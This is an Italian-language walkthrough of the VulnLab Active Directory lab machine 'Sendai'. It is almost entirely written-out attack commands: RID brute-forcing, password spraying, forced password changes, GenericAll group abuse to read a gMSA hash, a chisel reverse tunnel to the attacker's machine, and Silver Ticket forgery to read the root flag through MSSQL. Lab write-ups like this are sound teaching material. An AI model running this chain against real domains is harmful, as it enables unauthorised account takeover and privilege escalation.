+++
date = '2026-11-08T17:21:03+01:00'
draft = false
title = 'Sendai Writeup IT'
+++
**Autore**: **`joy.scd01`**

**Data**: **`05/11/2026`**

![pwn.pmg](/images/imgs_sendai/pwn.png)

---
# Introduzione

**_Sendai_** è un **Active Directory** di **VulnLab** classificata come **Medium** che offre un exploitation path realistico.

L'accesso iniziale richiede l'enumerazione anonima delle SMB share per scoprire una **policy IT** interna riguardante il reset obbligatorio delle password. Eseguendo un attacco di **RID brute-force**, è possibile mappare gli utenti del dominio e identificare gli account che richiedono un cambio password al login successivo.
Dopo aver cambiato la password di un utente ed aver ottenuto la user flag, il percorso si basa fortemente sull'analisi con **BloodHound** per scoprire  **`GenericAll`** su un gruppo AD, il quale a sua volta garantisce il diritto di leggere la password dell'account **gMSA** (**Group Managed Service Account**).
La Privilege Escalation prevede la scoperta di file di configurazione **SQL**, il pivoting tramite Chisel locale per raggiungere un'istanza **MSSQL** in ascolto internamente e, infine, la contraffazione di un **Silver Ticket** per accedere al database come **Administrator** ed estrarre la **root flag**.

---

# Tecniche Utilizzate

- **RID Brute-Forcing**

- **Forced Password Change Exploitation**

- **Active Directory ACL Abuse (GenericAll)**

- **Group Managed Service Account (gMSA) Abuse**

- **Network Pivoting & Port Forwarding (chisel)**

- **Silver Ticket Attack**

- **MSSQL Exploitation**

---

# Enumerazione

## nmap

Scansione iniziale su tutte le porte:

```bash
nmap -p- sendai -Pn
```

```text
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
443/tcp   open  https
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
```

Scansione mirata con script e rilevamento dei servizi:

```bash
nmap -sC -sV sendai -Pn 
```

```text
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-11-05 07:35:44Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sendai.vl, Site: Default-First-Site-Name)
443/tcp  open  ssl/https?
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
...
```

Ho aggiunto **`sendai.vl`** e **`dc.sendai.vl`** al mio **`/etc/hosts`**:

## Enumerazione SMB 

Trattandosi di un ambiente **Active Directory**, la verifica dell'**accesso SMB Anonymous** è sempre una priorità.

```bash
nxc smb sendai.vl -u 'Guest' -p '' --shares
```

![smb.png](/images/imgs_sendai/smb.png)

Ho trovato delle share accessibili e mi sono connesso usando **smbclient** come **Guest**.

```bash
smbclient \\\\sendai.vl\\sendai -U 'Guest'
```

![mget.png](/images/imgs_sendai/mget.png)

All'interno, ho trovato un file chiamato **`incident.txt`**. L'ho scaricato e ne ho letto il contenuto:

```text
Dear valued employees,

We hope this message finds you well. We would like to inform you about an important security update regarding user account passwords. Recently, we conducted a thorough penetration test, which revealed that a significant number of user accounts have weak and insecure passwords.

To address this concern and maintain the highest level of security within our organization, the IT department has taken immediate action. All user accounts with insecure passwords have been expired as a precautionary measure. This means that affected users will be required to change their passwords upon their next login.
...
```

Questo è un indizio enorme. Gli account con password deboli sono stati fatti scadere, e gli utenti sono costretti a cambiarla al loro prossimo login. Scoprendo quali sono gli utenti colpiti, si potrebbe potenzialmente cambiare la loro password e prendere il controllo dell'account.

---

# Accesso Iniziale | Password Reset Exploitation

Per prima cosa, avevo bisogno di una lista valida di utenti. Poiché l'accesso **Guest** era consentito, ho eseguito un attacco di **RID brute-force** tramite **NetExec**:

```bash
nxc smb sendai.vl -u 'Guest' -p '' --rid-brute
```

![ridbrute.png](/images/imgs_sendai/ridbrute.png)

Ho copiato e pulito l'output per creando una wordlist (**`users.txt`**):

```bash
cat users.txt | cut -d '\' -f2 | awk '{print $1}' | tee users.txt
```

Successivamente, ho effettuato uno spraying con password vuota su tutti gli utenti per verificare il loro stato di login:

```bash
nxc smb sendai.vl -u users.txt -p '' --continue-on-success
```

![changepass.png](/images/imgs_sendai/changepass.png)

Due utenti richiedevano un cambio password. Ho usato **`changepasswd.py`** di **Impacket** per cambiare la password di **`elliot.yates`** (**`Stars0@`**):

```bash
changepasswd.py sendai.vl/elliot.yates:@dc.sendai.vl -newpass 'Stars0@'
```

![changepass1.png](/images/imgs_sendai/changepass1.png)

---

# Lateral Movement | Domain Enumeration & gMSA Abuse

Con un set di credenziali valido, ho lanciato l'ingestor di **BloodHound** per raccogliere tutte le informazioni sul dominio:

```bash
bloodhound-python -u 'elliot.yates' -p 'Stars0@' -d sendai.vl --zip -c All -dc dc.sendai.vl -ns 10.129.234.66
```

![harvest.png](/images/imgs_sendai/harvest.png)

Analizzando i dati in **BloodHound**, ho scoperto che **`elliot.yates`** possiede i diritti **`GenericAll`** sul gruppo **`ADMSVC`**.

![blood1.png](/images/imgs_sendai/blood1.png)

A sua volta, il gruppo **`ADMSVC`** possiede i diritti **`ReadGMSAPassword`** sul Group Managed Service Account **`MGTSVC$`**.

![blood2.png](/images/imgs_sendai/blood2.png)

Ho usato **bloodyad** per aggiungere **`elliot.yates`** al gruppo **`ADMSVC`**:

```bash
bloodyad --host 10.129.234.66 -d sendai.vl -u elliot.yates -p 'Stars0@' add groupMember 'ADMSVC' 'elliot.yates'
```

![addmem.png](/images/imgs_sendai/addmem.png)

Da qui, ho potuto estrarre la password del **gMSA** per: **`MGTSVC$`**:

```bash
nxc ldap sendai.vl -u elliot.yates -p stars0@ --gmsa
```

![gmsa.png](/images/imgs_sendai/gmsa.png)

**NT hash** per **`MGTSVC$`**: **`88d544b552c4763c0333db7e48708a0d`**.

**Nota**: _Ripwnando questa macchina nel 2026 su un sistema completamente aggiornato, inizialmente **evil-winrm** falliva dando l'errore **`CLIENT_TO_SERVER_SEALING`**. Questa è una nota incompatibilità con **`Ruby/OpenSSL 3`** (dove l'RC4 legacy è disabilitato di default). Per leggere la **user flag** mentre facevo troubleshooting, ho usato **`nxc winrm`** per eseguire comandi._

```bash
nxc winrm 10.129.234.66 -u 'mgtsvc$' -H '88d544b552c4763c0333db7e48708a0d' -x 'type C:\Users\mgtsvc$\Desktop\user.txt'
```

![userf.png](/images/imgs_sendai/userf.png)

---

# Privilege Escalation | Chisel Pivoting & Silver Ticket Attack

Durante l'enumerazione iniziale su SMB, avevo trovato anche la share **`config`**.

```bash
smbclient \\\\sendai.vl\\config -U elliot.yates
mget * 
cat .sqlconfig
```

![smb2.png](/images/imgs_sendai/smb2.png)

![sqlpass.png](/images/imgs_sendai/sqlpass.png)

Il file al suo interno conteneva le credenziali per **`sqlsvc`**, ma secondo la scansione **Nmap** la porta **`1433`** (**MSSQL**) non era esposta esternamente. Quindi necessitavo di una sessione interattiva per fare pivoting. Da qui in poi ho iniziato a perdere tempo, cercando un modo per accedere in remoto alla macchina.

Non so ancora perché (visto che non era la prima volta che lanciavo questo comando sperando di risolvere), ma dopo aver eseguito un semplice **`sudo apt update && sudo apt full-upgrade`**, il bug di **`OpenSSL/Ruby`** si è risolto misteriosamente da solo, permettendomi finalmente di connettermi via **WinRM**:

```bash
evil-winrm -i sendai.vl -u 'mgtsvc$' -H "88d544b552c4763c0333db7e48708a0d" 
```

Una volta dentro, ho controllato le porte in ascolto:

```bash
netstat -ano | findstr :1433
```

![netstat.png](/images/imgs_sendai/netstat.png)

**MSSQL** era effettivamente bindato su localhost. Ho caricato **`chisel.exe`** per impostare un reverse port forward verso la mia macchina attaccante:

```bash
# Su Kali
chisel server -p 8000 --reverse

# Su Sendai (evil-winrm)
upload chisel.exe
.\chisel.exe client 10.10.14.79:8000 R:socks
```

![tunnel.png](/images/imgs_sendai/tunnel.png)

Stabilito il tunnel, potevo interagire con l'istanza **MSSQL** interna usando **proxychains**. Tuttavia, non volendo solo un accesso standard, ma il controllo totale, ho generato l'**NT Hash** per **`SurenessBlob85`** utilizzando un convertitore online, ho recuperato il **SID del dominio** tramite **enum4linux**, e ho forgiato un **Silver Ticket** per l'**Administrator**:

```bash
# Domain SID
enum4linux sendai.vl | grep Sid
```

![sid.png](/images/imgs_sendai/sid.png)

```bash
# Forgiare il Silver Ticket
ticketer.py -spn MSSQL/dc.sendai.vl -domain-sid <dom-sid> -nthash <sqlsvc-hash> -dc-ip dc.sendai.vl -domain sendai.vl Administrator

# Esportare la cache
export KRB5CCNAME=Administrator.ccache
```

![ticketer.png](/images/imgs_sendai/ticketer.png)

Usando **proxychains** e **`mssqlclient.py`** con autenticazione **Kerberos** (**`-k -no-pass`**), mi sono connesso al database con i privilegi elevati dell'**Administrator** impersonato.

```bash
proxychains mssqlclient.py dc.sendai.vl -k -no-pass
```

Ho usato la funzione **`OPENROWSET`** per leggere la **root flag** direttamente dal file system:

```sql
SELECT * FROM OPENROWSET(BULK N'C:\Users\Administrator\Desktop\root.txt', SINGLE_CLOB) AS Contents
```

---

# Considerazioni Finali

**_Sendai_** è una macchina estremamente soddisfacente. Il foothold iniziale che richiede un reset della password basato su una memo IT interna è uno scenario realistico. Mappare il percorso di attacco da **GenericAll** a **ReadGMSAPassword** con **BloodHound** rafforza i concetti fondamentali di abuso di **Active Directory**. Infine, dover proxare il traffico per raggiungere un'istanza **MSSQL** interna ed eseguire un **attacco Silver Ticket** per leggere la **root flag** ha reso la fase di Privilege Escalation davvero eccellente.

Il bug di **Ruby/OpenSSL 3** con **evil-winrm** è stato decisamente frustrante, ma imparare a ripiegare su **nxc winrm** per continuare ad avanzare è esattamente il motivo per cui avere un toolkit versatile è essenziale.

